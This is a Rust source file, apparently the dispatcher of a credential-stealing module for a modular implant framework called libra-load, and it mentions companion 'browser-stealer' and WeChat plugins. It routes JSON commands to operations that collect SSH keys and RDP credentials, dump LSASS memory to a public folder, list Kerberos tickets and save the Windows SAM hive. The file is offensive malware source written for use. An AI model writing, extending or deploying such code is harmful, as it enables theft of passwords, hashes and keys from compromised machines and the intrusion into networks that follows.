//! Credentials cloud module — RDP, SSH (WeChat/browser live in plugins:
//! com.libra.wechat-file / com.libra.browser-stealer).
#![allow(non_snake_case)]
#![allow(clippy::upper_case_acronyms)]

#[cfg(target_os = "windows")]
mod kerberos;
#[cfg(target_os = "windows")]
mod lsass;
mod rdp_creds;
mod sam;
mod ssh_keys;

use serde_json::Value;

/// libra-load ABI entry point.
#[no_mangle]
pub extern "C" fn module_name() -> *const u8 {
    concat!("creds", "\0").as_ptr() as *const u8
}

#[no_mangle]
pub unsafe extern "system" fn module_main(
    input: *const u8,
    input_len: usize,
    output: *mut u8,
    output_cap: usize,
) -> usize {
    let input_json = if input.is_null() || input_len == 0 {
        "{}".to_string()
    } else {
        String::from_utf8_lossy(std::slice::from_raw_parts(input, input_len)).to_string()
    };
    let result = dispatch(&input_json);
    write_output(&result, output, output_cap)
}

fn dispatch(input: &str) -> String {
    let v: Value = serde_json::from_str(input).unwrap_or(Value::Object(Default::default()));
    let op = v.get("op").and_then(|o| o.as_str()).unwrap_or("");

    match op {
        "ssh" => ssh_keys::SshKeys::collect(),
        "rdp" => rdp_creds::RdpCreds::collect(),
        "lsass" => {
            #[cfg(target_os = "windows")]
            {
                let path = v
                    .get("path")
                    .and_then(|p| p.as_str())
                    .unwrap_or("C:\\Users\\Public\\lsass.dmp");
                return lsass::dump_lsass(path);
            }
            #[cfg(not(target_os = "windows"))]
            {
                r#"{"success":false,"error":"lsass dump not supported on this platform}"#
                    .to_string()
            }
        }
        "klist" => {
            #[cfg(target_os = "windows")]
            {
                return kerberos::klist();
            }
            #[cfg(not(target_os = "windows"))]
            {
                r#"{"success":false,"error":"kerberos klist not supported on this platform"}"#
                    .to_string()
            }
        }
        "sam" => {
            let dir = v
                .get("dir")
                .and_then(|p| p.as_str())
                .unwrap_or("C:\\Users\\Public");
            sam::save_sam(dir)
        }
        _ => format!(r#"{{"error":"unknown creds op '{}'"}}"#, op),
    }
}

fn write_output(s: &str, output: *mut u8, output_cap: usize) -> usize {
    let bytes = s.as_bytes();
    let n = bytes.len().min(output_cap);
    if n > 0 && !output.is_null() {
        unsafe {
            std::ptr::copy_nonoverlapping(bytes.as_ptr(), output, n);
        }
    }
    n
}
